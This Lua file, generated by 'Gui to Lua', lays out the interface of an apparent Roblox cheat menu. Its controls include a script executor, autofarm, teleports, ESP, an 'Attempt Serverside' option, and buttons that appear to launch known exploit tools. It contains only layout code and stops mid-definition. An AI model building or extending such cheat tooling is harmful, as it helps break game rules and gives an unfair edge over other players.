-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local MainTabs = Instance.new("Frame")
local Tab1 = Instance.new("TextButton")
local Tab2 = Instance.new("TextButton")
local Tab4 = Instance.new("TextButton")
local Tab3 = Instance.new("TextButton")
local Tab6 = Instance.new("TextButton")
local Tab5 = Instance.new("TextButton")
local Executor = Instance.new("TextButton")
local Tab7 = Instance.new("TextButton")
local Tabs = Instance.new("Folder")
local Tab1_2 = Instance.new("Frame")
local _15SecondTS = Instance.new("TextLabel")
local _15SecondTSButton = Instance.new("ImageButton")
local TextLabel = Instance.new("TextLabel")
local Keybind = Instance.new("TextBox")
local TextLabel_2 = Instance.new("TextLabel")
local AntiTE = Instance.new("TextLabel")
local AntiTEButton = Instance.new("ImageButton")
local BlockGlitch = Instance.new("TextLabel")
local BlockGlitch_2 = Instance.new("ImageButton")
local Executor_2 = Instance.new("Frame")
local TextLabel_3 = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local Execute = Instance.new("TextButton")
local Clear = Instance.new("TextButton")
local Home = Instance.new("Frame")
local Welcome = Instance.new("TextLabel")
local Quote = Instance.new("TextLabel")
local TextBox_2 = Instance.new("TextBox")
local Tab2_2 = Instance.new("Frame")
local STWRTZ = Instance.new("TextLabel")
local STWRTZButton = Instance.new("ImageButton")
local TextLabel_4 = Instance.new("TextLabel")
local GERRTZ = Instance.new("TextLabel")
local STWRTZButton_2 = Instance.new("ImageButton")
local D4CClones = Instance.new("TextLabel")
local D4CClonesButton = Instance.new("ImageButton")
local Tab6_2 = Instance.new("Frame")
local InvisStand = Instance.new("TextLabel")
local InvisStandButton = Instance.new("ImageButton")
local TextLabel_5 = Instance.new("TextLabel")
local Autofarm = Instance.new("TextLabel")
local AutofarmButton = Instance.new("ImageButton")
local TextLabel_6 = Instance.new("TextLabel")
local Stand = Instance.new("TextBox")
local HealthBars = Instance.new("TextLabel")
local HealthBarsButton = Instance.new("ImageButton")
local Tab7_2 = Instance.new("Frame")
local TextLabel_7 = Instance.new("TextLabel")
local TPButtonBasePlate = Instance.new("TextButton")
local TPButtonWaterfall = Instance.new("TextButton")
local TPButtonArenaLeft = Instance.new("TextButton")
local TPButtonStandChangerNpc = Instance.new("TextButton")
local TPButtonFarmZone = Instance.new("TextButton")
local TPButtonLoadingScreen = Instance.new("TextButton")
local TPButtonArenaRight = Instance.new("TextButton")
local TPButtonBossEntrance = Instance.new("TextButton")
local TPButtonMiddle = Instance.new("TextButton")
local TPButtonZeldaMoon = Instance.new("TextButton")
local TPButtonRachaelHouse = Instance.new("TextButton")
local TPButtonD4C = Instance.new("TextButton")
local Tab4_2 = Instance.new("Frame")
local VTWKnife = Instance.new("TextLabel")
local VTWKnifeButton = Instance.new("ImageButton")
local TextLabel_8 = Instance.new("TextLabel")
local Keybind_2 = Instance.new("TextBox")
local TextLabel_9 = Instance.new("TextLabel")
local OniIFrames = Instance.new("TextLabel")
local OniIFramesButton = Instance.new("ImageButton")
local EpiWarning = Instance.new("TextLabel")
local EpiWarningButton = Instance.new("ImageButton")
local Tab3_2 = Instance.new("Frame")
local ESplash = Instance.new("TextLabel")
local ESplashButton = Instance.new("ImageButton")
local TextLabel_10 = Instance.new("TextLabel")
local Keybind_3 = Instance.new("TextBox")
local TextLabel_11 = Instance.new("TextLabel")
local SpamSounds = Instance.new("TextLabel")
local SpamSoundsButton = Instance.new("ImageButton")
local TSMovement = Instance.new("TextLabel")
local TSMovementButton = Instance.new("ImageButton")
local Tab5_2 = Instance.new("Frame")
local SpinDash = Instance.new("TextLabel")
local SpinDashButton = Instance.new("ImageButton")
local TextLabel_12 = Instance.new("TextLabel")
local StandlessCounter = Instance.new("TextLabel")
local StandlessCounterButton = Instance.new("ImageButton")
local VTW1TapsBar = Instance.new("TextLabel")
local VTW1TapsButton = Instance.new("ImageButton")
local Settings = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local ReduceLag = Instance.new("TextButton")
local DeleteFire = Instance.new("TextButton")
local AttemptServerside = Instance.new("TextButton")
local RespawnSameSpot = Instance.new("TextButton")
local Settings_2 = Instance.new("ImageButton")
local Close = Instance.new("TextButton")
local Minimize = Instance.new("TextButton")
local SHub = Instance.new("TextButton")
local Sidebar = Instance.new("Frame")
local ScrollingFrame_2 = Instance.new("ScrollingFrame")
local IY = Instance.new("TextButton")
local Dex = Instance.new("TextButton")
local SAF = Instance.new("TextButton")
local HBEGUI = Instance.new("TextButton")
local NA = Instance.new("TextButton")
local Hydroxide = Instance.new("TextButton")
local Rspy = Instance.new("TextButton")
local Title = Instance.new("TextLabel")
local Home_2 = Instance.new("ImageButton")
local Clock = Instance.new("TextLabel")
local ProfilePicture = Instance.new("ImageLabel")
local SidebarMusic = Instance.new("Frame")
local ScrollingFrame_3 = Instance.new("ScrollingFrame")
local Lofi = Instance.new("TextButton")
local Music = Instance.new("ImageButton")
local FullView = Instance.new("TextButton")
local SFX = Instance.new("Folder")
local Music_2 = Instance.new("Folder")
local Rock = Instance.new("Folder")
local Lofi_2 = Instance.new("Folder")
local Retro = Instance.new("Folder")
local UI = Instance.new("Folder")

--Properties:

ScreenGui.Parent = game:WaitForChild("CoreGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(61, 61, 61)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 5
Frame.Position = UDim2.new(0.168380469, 0, 0.206766918, 0)
Frame.Size = UDim2.new(0, 516, 0, 29)

MainTabs.Name = "MainTabs"
MainTabs.Parent = Frame
MainTabs.BackgroundColor3 = Color3.fromRGB(167, 167, 167)
MainTabs.BackgroundTransparency = 0.300
MainTabs.BorderColor3 = Color3.fromRGB(0, 0, 0)
MainTabs.BorderSizePixel = 5
MainTabs.Position = UDim2.new(0, 0, 1, 0)
MainTabs.Size = UDim2.new(0, 516, 0, 223)

Tab1.Name = "Tab 1"
Tab1.Parent = MainTabs
Tab1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab1.BackgroundTransparency = 1.000
Tab1.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab1.BorderSizePixel = 0
Tab1.Size = UDim2.new(0, 104, 0, 28)
Tab1.Font = Enum.Font.Unknown
Tab1.Text = "Tab 1"
Tab1.TextColor3 = Color3.fromRGB(0, 0, 0)
Tab1.TextSize = 14.000

Tab2.Name = "Tab 2"
Tab2.Parent = MainTabs
Tab2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab2.BackgroundTransparency = 1.000
Tab2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab2.BorderSizePixel = 0
Tab2.Position = UDim2.new(0, 0, 0.125560537, 0)
Tab2.Size = UDim2.new(0, 104, 0, 28)
Tab2.Font = Enum.Font.Unknown
Tab2.Text = "Tab 2"
Tab2.TextColor3 = Color3.fromRGB(0, 0, 0)
Tab2.TextSize = 14.000

Tab4.Name = "Tab 4"
Tab4.Parent = MainTabs
Tab4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab4.BackgroundTransparency = 1.000
Tab4.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab4.BorderSizePixel = 0
Tab4.Position = UDim2.new(0, 0, 0.376681626, 0)
Tab4.Size = UDim2.new(0, 104, 0, 28)
Tab4.Font = Enum.Font.Unknown
Tab4.Text = "Tab 4"
Tab4.TextColor3 = Color3.fromRGB(0, 0, 0)
Tab4.TextSize = 14.000

Tab3.Name = "Tab 3"
Tab3.Parent = MainTabs
Tab3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab3.BackgroundTransparency = 1.000
Tab3.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab3.BorderSizePixel = 0
Tab3.Position = UDim2.new(0, 0, 0.251121074, 0)
Tab3.Size = UDim2.new(0, 104, 0, 28)
Tab3.Font = Enum.Font.Unknown
Tab3.Text = "Tab 3"
Tab3.TextColor3 = Color3.fromRGB(0, 0, 0)
Tab3.TextSize = 14.000

Tab6.Name = "Tab 6"
Tab6.Parent = MainTabs
Tab6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab6.BackgroundTransparency = 1.000
Tab6.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab6.BorderSizePixel = 0
Tab6.Position = UDim2.new(0, 0, 0.62780267, 0)
Tab6.Size = UDim2.new(0, 104, 0, 28)
Tab6.Font = Enum.Font.Unknown
Tab6.Text = "Tab 6"
Tab6.TextColor3 = Color3.fromRGB(0, 0, 0)
Tab6.TextSize = 14.000

Tab5.Name = "Tab 5"
Tab5.Parent = MainTabs
Tab5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab5.BackgroundTransparency = 1.000
Tab5.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab5.BorderSizePixel = 0
Tab5.Position = UDim2.new(0, 0, 0.502242148, 0)
Tab5.Size = UDim2.new(0, 104, 0, 28)
Tab5.Font = Enum.Font.Unknown
Tab5.Text = "Tab 5"
Tab5.TextColor3 = Color3.fromRGB(0, 0, 0)
Tab5.TextSize = 14.000

Executor.Name = "Executor"
Executor.Parent = MainTabs
Executor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Executor.BackgroundTransparency = 1.000
Executor.BorderColor3 = Color3.fromRGB(0, 0, 0)
Executor.BorderSizePixel = 0
Executor.Position = UDim2.new(0, 0, 0.878923774, 0)
Executor.Size = UDim2.new(0, 104, 0, 28)
Executor.Font = Enum.Font.Unknown
Executor.Text = "Executor"
Executor.TextColor3 = Color3.fromRGB(0, 0, 0)
Executor.TextSize = 14.000

Tab7.Name = "Tab 7"
Tab7.Parent = MainTabs
Tab7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab7.BackgroundTransparency = 1.000
Tab7.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab7.BorderSizePixel = 0
Tab7.Position = UDim2.new(0, 0, 0.753363252, 0)
Tab7.Size = UDim2.new(0, 104, 0, 28)
Tab7.Font = Enum.Font.Unknown
Tab7.Text = "Tab 7"
Tab7.TextColor3 = Color3.fromRGB(0, 0, 0)
Tab7.TextSize = 14.000

Tabs.Name = "Tabs"
Tabs.Parent = MainTabs

Tab1_2.Name = "Tab1"
Tab1_2.Parent = Tabs
Tab1_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab1_2.BackgroundTransparency = 0.500
Tab1_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab1_2.BorderSizePixel = 5
Tab1_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Tab1_2.Size = UDim2.new(0, 412, 0, 224)
Tab1_2.Visible = false

_15SecondTS.Name = "15SecondTS"
_15SecondTS.Parent = Tab1_2
_15SecondTS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
_15SecondTS.BackgroundTransparency = 1.000
_15SecondTS.BorderColor3 = Color3.fromRGB(0, 0, 0)
_15SecondTS.BorderSizePixel = 0
_15SecondTS.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
_15SecondTS.Size = UDim2.new(0, 200, 0, 50)
_15SecondTS.Font = Enum.Font.ArialBold
_15SecondTS.Text = "15 Second TS"
_15SecondTS.TextColor3 = Color3.fromRGB(0, 0, 0)
_15SecondTS.TextScaled = true
_15SecondTS.TextSize = 14.000
_15SecondTS.TextWrapped = true

_15SecondTSButton.Name = "15SecondTSButton"
_15SecondTSButton.Parent = _15SecondTS
_15SecondTSButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
_15SecondTSButton.BackgroundTransparency = 1.000
_15SecondTSButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
_15SecondTSButton.BorderSizePixel = 0
_15SecondTSButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
_15SecondTSButton.Size = UDim2.new(0, 20, 0, 32)
_15SecondTSButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

TextLabel.Parent = _15SecondTS
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(1, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 28)
TextLabel.Font = Enum.Font.ArialBold
TextLabel.Text = "Bind A Key"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 25.000
TextLabel.TextWrapped = true

Keybind.Name = "Keybind"
Keybind.Parent = TextLabel
Keybind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Keybind.BorderColor3 = Color3.fromRGB(0, 0, 0)
Keybind.BorderSizePixel = 5
Keybind.Position = UDim2.new(0.305000007, 0, 0.969522178, 0)
Keybind.Size = UDim2.new(0, 70, 0, 30)
Keybind.Font = Enum.Font.SourceSans
Keybind.Text = ""
Keybind.TextColor3 = Color3.fromRGB(0, 0, 0)
Keybind.TextScaled = true
Keybind.TextSize = 14.000
Keybind.TextWrapped = true

TextLabel_2.Parent = Tab1_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 5
TextLabel_2.Size = UDim2.new(0, 412, 0, 22)
TextLabel_2.Font = Enum.Font.Unknown
TextLabel_2.Text = "TAB 1"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

AntiTE.Name = "AntiTE"
AntiTE.Parent = Tab1_2
AntiTE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AntiTE.BackgroundTransparency = 1.000
AntiTE.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiTE.BorderSizePixel = 0
AntiTE.Position = UDim2.new(0.0825242698, 0, 0.40625, 0)
AntiTE.Size = UDim2.new(0, 200, 0, 50)
AntiTE.Font = Enum.Font.ArialBold
AntiTE.Text = "Time Erase ESP"
AntiTE.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiTE.TextScaled = true
AntiTE.TextSize = 14.000
AntiTE.TextWrapped = true

AntiTEButton.Name = "AntiTEButton"
AntiTEButton.Parent = AntiTE
AntiTEButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AntiTEButton.BackgroundTransparency = 1.000
AntiTEButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiTEButton.BorderSizePixel = 0
AntiTEButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
AntiTEButton.Size = UDim2.new(0, 20, 0, 32)
AntiTEButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

BlockGlitch.Name = "BlockGlitch"
BlockGlitch.Parent = Tab1_2
BlockGlitch.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BlockGlitch.BackgroundTransparency = 1.000
BlockGlitch.BorderColor3 = Color3.fromRGB(0, 0, 0)
BlockGlitch.BorderSizePixel = 0
BlockGlitch.Position = UDim2.new(0.0825242698, 0, 0.705357134, 0)
BlockGlitch.Size = UDim2.new(0, 200, 0, 50)
BlockGlitch.Font = Enum.Font.ArialBold
BlockGlitch.Text = "Block Glitch"
BlockGlitch.TextColor3 = Color3.fromRGB(0, 0, 0)
BlockGlitch.TextScaled = true
BlockGlitch.TextSize = 14.000
BlockGlitch.TextWrapped = true

BlockGlitch_2.Name = "BlockGlitch"
BlockGlitch_2.Parent = BlockGlitch
BlockGlitch_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BlockGlitch_2.BackgroundTransparency = 1.000
BlockGlitch_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
BlockGlitch_2.BorderSizePixel = 0
BlockGlitch_2.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
BlockGlitch_2.Size = UDim2.new(0, 20, 0, 32)
BlockGlitch_2.Image = "http://www.roblox.com/asset/?id=107075188558816"

Executor_2.Name = "Executor"
Executor_2.Parent = Tabs
Executor_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Executor_2.BackgroundTransparency = 0.500
Executor_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Executor_2.BorderSizePixel = 5
Executor_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Executor_2.Size = UDim2.new(0, 412, 0, 224)
Executor_2.Visible = false

TextLabel_3.Parent = Executor_2
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.BorderSizePixel = 5
TextLabel_3.Size = UDim2.new(0, 412, 0, 22)
TextLabel_3.Font = Enum.Font.Unknown
TextLabel_3.Text = "AWAKENED EXECUTOR"
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

TextBox.Parent = Executor_2
TextBox.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0, 0, 0.0982142836, 0)
TextBox.Size = UDim2.new(0, 412, 0, 140)
TextBox.Font = Enum.Font.SourceSans
TextBox.MultiLine = true
TextBox.Text = "--WRITE YOUR SCRIPT"
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 14.000
TextBox.TextWrapped = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top

Execute.Name = "Execute"
Execute.Parent = Executor_2
Execute.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Execute.BorderColor3 = Color3.fromRGB(0, 0, 0)
Execute.BorderSizePixel = 0
Execute.Position = UDim2.new(0, 0, 0.723214269, 0)
Execute.Size = UDim2.new(0, 202, 0, 62)
Execute.Font = Enum.Font.SourceSans
Execute.Text = "EXECUTE"
Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
Execute.TextSize = 14.000

Clear.Name = "Clear"
Clear.Parent = Executor_2
Clear.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Clear.BorderColor3 = Color3.fromRGB(0, 0, 0)
Clear.BorderSizePixel = 0
Clear.Position = UDim2.new(0.509708762, 0, 0.723214269, 0)
Clear.Size = UDim2.new(0, 202, 0, 62)
Clear.Font = Enum.Font.SourceSans
Clear.Text = "CLEAR"
Clear.TextColor3 = Color3.fromRGB(255, 255, 255)
Clear.TextSize = 14.000

Home.Name = "Home"
Home.Parent = Tabs
Home.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Home.BackgroundTransparency = 1.000
Home.BorderColor3 = Color3.fromRGB(0, 0, 0)
Home.BorderSizePixel = 0
Home.Position = UDim2.new(0.187984496, 0, 0, 0)
Home.Size = UDim2.new(0, 419, 0, 224)

Welcome.Name = "Welcome"
Welcome.Parent = Home
Welcome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Welcome.BackgroundTransparency = 1.000
Welcome.BorderColor3 = Color3.fromRGB(0, 0, 0)
Welcome.BorderSizePixel = 0
Welcome.Position = UDim2.new(0.0167064443, 0, 0.0758928582, 0)
Welcome.Size = UDim2.new(0, 365, 0, 50)
Welcome.Font = Enum.Font.SourceSans
Welcome.Text = "Welcome, User!"
Welcome.TextColor3 = Color3.fromRGB(0, 0, 0)
Welcome.TextScaled = true
Welcome.TextSize = 14.000
Welcome.TextWrapped = true
Welcome.TextXAlignment = Enum.TextXAlignment.Left

Quote.Name = "Quote"
Quote.Parent = Home
Quote.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Quote.BackgroundTransparency = 1.000
Quote.BorderColor3 = Color3.fromRGB(0, 0, 0)
Quote.BorderSizePixel = 0
Quote.Position = UDim2.new(0, 0, 0.325892866, 0)
Quote.Size = UDim2.new(0, 353, 0, 64)
Quote.Font = Enum.Font.SourceSans
Quote.Text = "Quote"
Quote.TextColor3 = Color3.fromRGB(0, 0, 0)
Quote.TextScaled = true
Quote.TextSize = 14.000
Quote.TextWrapped = true

TextBox_2.Parent = Home
TextBox_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox_2.BackgroundTransparency = 0.250
TextBox_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox_2.BorderSizePixel = 5
TextBox_2.Position = UDim2.new(0.0167064443, 0, 0.700892866, 0)
TextBox_2.Size = UDim2.new(0, 390, 0, 50)
TextBox_2.Font = Enum.Font.SourceSans
TextBox_2.Text = "COPY PASTE THIS FOR INVITE"
TextBox_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_2.TextScaled = true
TextBox_2.TextSize = 14.000
TextBox_2.TextStrokeTransparency = 0.000
TextBox_2.TextWrapped = true

Tab2_2.Name = "Tab2"
Tab2_2.Parent = Tabs
Tab2_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab2_2.BackgroundTransparency = 0.500
Tab2_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab2_2.BorderSizePixel = 5
Tab2_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Tab2_2.Size = UDim2.new(0, 412, 0, 224)
Tab2_2.Visible = false

STWRTZ.Name = "STWRTZ"
STWRTZ.Parent = Tab2_2
STWRTZ.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
STWRTZ.BackgroundTransparency = 1.000
STWRTZ.BorderColor3 = Color3.fromRGB(0, 0, 0)
STWRTZ.BorderSizePixel = 0
STWRTZ.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
STWRTZ.Size = UDim2.new(0, 200, 0, 50)
STWRTZ.Font = Enum.Font.ArialBold
STWRTZ.Text = "Shadow The World Dodge"
STWRTZ.TextColor3 = Color3.fromRGB(0, 0, 0)
STWRTZ.TextScaled = true
STWRTZ.TextSize = 14.000
STWRTZ.TextWrapped = true

STWRTZButton.Name = "STWRTZButton"
STWRTZButton.Parent = STWRTZ
STWRTZButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
STWRTZButton.BackgroundTransparency = 1.000
STWRTZButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
STWRTZButton.BorderSizePixel = 0
STWRTZButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
STWRTZButton.Size = UDim2.new(0, 20, 0, 32)
STWRTZButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

TextLabel_4.Parent = Tab2_2
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.BorderSizePixel = 5
TextLabel_4.Size = UDim2.new(0, 412, 0, 22)
TextLabel_4.Font = Enum.Font.Unknown
TextLabel_4.Text = "TAB 2"
TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14.000
TextLabel_4.TextWrapped = true

GERRTZ.Name = "GERRTZ"
GERRTZ.Parent = Tab2_2
GERRTZ.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GERRTZ.BackgroundTransparency = 1.000
GERRTZ.BorderColor3 = Color3.fromRGB(0, 0, 0)
GERRTZ.BorderSizePixel = 0
GERRTZ.Position = UDim2.new(0.0825242698, 0, 0.379464298, 0)
GERRTZ.Size = UDim2.new(0, 200, 0, 50)
GERRTZ.Font = Enum.Font.ArialBold
GERRTZ.Text = "GER Return To Zero"
GERRTZ.TextColor3 = Color3.fromRGB(0, 0, 0)
GERRTZ.TextScaled = true
GERRTZ.TextSize = 14.000
GERRTZ.TextWrapped = true

STWRTZButton_2.Name = "STWRTZButton"
STWRTZButton_2.Parent = GERRTZ
STWRTZButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
STWRTZButton_2.BackgroundTransparency = 1.000
STWRTZButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
STWRTZButton_2.BorderSizePixel = 0
STWRTZButton_2.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
STWRTZButton_2.Size = UDim2.new(0, 20, 0, 32)
STWRTZButton_2.Image = "http://www.roblox.com/asset/?id=107075188558816"

D4CClones.Name = "D4CClones"
D4CClones.Parent = Tab2_2
D4CClones.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
D4CClones.BackgroundTransparency = 1.000
D4CClones.BorderColor3 = Color3.fromRGB(0, 0, 0)
D4CClones.BorderSizePixel = 0
D4CClones.Position = UDim2.new(0.0825242698, 0, 0.65625, 0)
D4CClones.Size = UDim2.new(0, 200, 0, 50)
D4CClones.Font = Enum.Font.ArialBold
D4CClones.Text = "D4C Clone Spam (F2, F3, F4)"
D4CClones.TextColor3 = Color3.fromRGB(0, 0, 0)
D4CClones.TextScaled = true
D4CClones.TextSize = 14.000
D4CClones.TextWrapped = true

D4CClonesButton.Name = "D4CClonesButton"
D4CClonesButton.Parent = D4CClones
D4CClonesButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
D4CClonesButton.BackgroundTransparency = 1.000
D4CClonesButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
D4CClonesButton.BorderSizePixel = 0
D4CClonesButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
D4CClonesButton.Size = UDim2.new(0, 20, 0, 32)
D4CClonesButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

Tab6_2.Name = "Tab6"
Tab6_2.Parent = Tabs
Tab6_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab6_2.BackgroundTransparency = 0.500
Tab6_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab6_2.BorderSizePixel = 5
Tab6_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Tab6_2.Size = UDim2.new(0, 412, 0, 224)
Tab6_2.Visible = false

InvisStand.Name = "InvisStand"
InvisStand.Parent = Tab6_2
InvisStand.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InvisStand.BackgroundTransparency = 1.000
InvisStand.BorderColor3 = Color3.fromRGB(0, 0, 0)
InvisStand.BorderSizePixel = 0
InvisStand.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
InvisStand.Size = UDim2.new(0, 200, 0, 50)
InvisStand.Font = Enum.Font.ArialBold
InvisStand.Text = "Invisible Stand"
InvisStand.TextColor3 = Color3.fromRGB(0, 0, 0)
InvisStand.TextScaled = true
InvisStand.TextSize = 14.000
InvisStand.TextWrapped = true

InvisStandButton.Name = "InvisStandButton"
InvisStandButton.Parent = InvisStand
InvisStandButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InvisStandButton.BackgroundTransparency = 1.000
InvisStandButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
InvisStandButton.BorderSizePixel = 0
InvisStandButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
InvisStandButton.Size = UDim2.new(0, 20, 0, 32)
InvisStandButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

TextLabel_5.Parent = Tab6_2
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.BorderSizePixel = 5
TextLabel_5.Size = UDim2.new(0, 412, 0, 22)
TextLabel_5.Font = Enum.Font.Unknown
TextLabel_5.Text = "TAB 6"
TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14.000
TextLabel_5.TextWrapped = true

Autofarm.Name = "Autofarm"
Autofarm.Parent = Tab6_2
Autofarm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Autofarm.BackgroundTransparency = 1.000
Autofarm.BorderColor3 = Color3.fromRGB(0, 0, 0)
Autofarm.BorderSizePixel = 0
Autofarm.Position = UDim2.new(0.0825242698, 0, 0.705357134, 0)
Autofarm.Size = UDim2.new(0, 200, 0, 50)
Autofarm.Font = Enum.Font.ArialBold
Autofarm.Text = "Autofarm"
Autofarm.TextColor3 = Color3.fromRGB(0, 0, 0)
Autofarm.TextScaled = true
Autofarm.TextSize = 14.000
Autofarm.TextWrapped = true

AutofarmButton.Name = "AutofarmButton"
AutofarmButton.Parent = Autofarm
AutofarmButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutofarmButton.BackgroundTransparency = 1.000
AutofarmButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
AutofarmButton.BorderSizePixel = 0
AutofarmButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
AutofarmButton.Size = UDim2.new(0, 20, 0, 32)
AutofarmButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

TextLabel_6.Parent = Autofarm
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.BorderSizePixel = 0
TextLabel_6.Position = UDim2.new(1.16499996, 0, -0.140000001, 0)
TextLabel_6.Size = UDim2.new(0, 150, 0, 46)
TextLabel_6.Font = Enum.Font.ArialBold
TextLabel_6.Text = "Autofarm Stand (Example: TW, SP)"
TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 1.000
TextLabel_6.TextWrapped = true
TextLabel_6.TextYAlignment = Enum.TextYAlignment.Top

Stand.Name = "Stand"
Stand.Parent = TextLabel_6
Stand.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
